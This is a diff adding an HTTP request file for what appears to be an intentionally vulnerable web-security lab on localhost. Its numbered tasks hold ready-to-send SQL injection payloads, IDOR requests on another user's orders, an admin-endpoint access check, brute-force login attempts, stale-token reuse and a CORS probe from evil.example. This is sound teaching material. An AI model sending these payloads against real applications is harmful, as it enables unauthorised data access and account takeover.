@@ -1,0 +1,57 @@
+@base = http://localhost:5080
+
+### Health: list products (anonymous)
+GET {{base}}/api/products
+
+### --- Task 01: SQL Injection (sortBy is the cleanest injection point) ---
+GET {{base}}/api/products/search?name=&sortBy=Price DESC -- 
+
+### Task 01: boolean injection through name
+GET {{base}}/api/products/search?name=%' OR '1'='1&sortBy=Name
+
+### --- Auth ---
+# @name login
+POST {{base}}/api/auth/login
+Content-Type: application/json
+
+{ "email": "alice@lab.local", "password": "Password1!" }
+
+###
+@token = {{login.response.body.token}}
+
+### Who am I
+GET {{base}}/api/auth/me
+Authorization: Bearer {{token}}
+
+### --- Task 03: IDOR — Alice reads Bob's order (id 2) ---
+GET {{base}}/api/orders/2
+Authorization: Bearer {{token}}
+
+### Task 03: IDOR — Alice cancels Bob's order
+POST {{base}}/api/orders/2/cancel
+Authorization: Bearer {{token}}
+
+### --- Task 04: Function-level — regular user hits admin endpoint ---
+GET {{base}}/api/admin/users
+Authorization: Bearer {{token}}
+
+### --- Task 06: Brute force — repeat this with wrong passwords, never throttled ---
+POST {{base}}/api/auth/login
+Content-Type: application/json
+
+{ "email": "alice@lab.local", "password": "wrong" }
+
+### --- Task 07: change password, then reuse the OLD token below ---
+POST {{base}}/api/auth/change-password
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{ "currentPassword": "Password1!", "newPassword": "NewPassw0rd!" }
+
+### Task 07: old token still works after password change (vulnerable)
+GET {{base}}/api/auth/me
+Authorization: Bearer {{token}}
+
+### --- Task 09: permissive CORS — any origin is allowed ---
+GET {{base}}/api/products
+Origin: https://evil.example
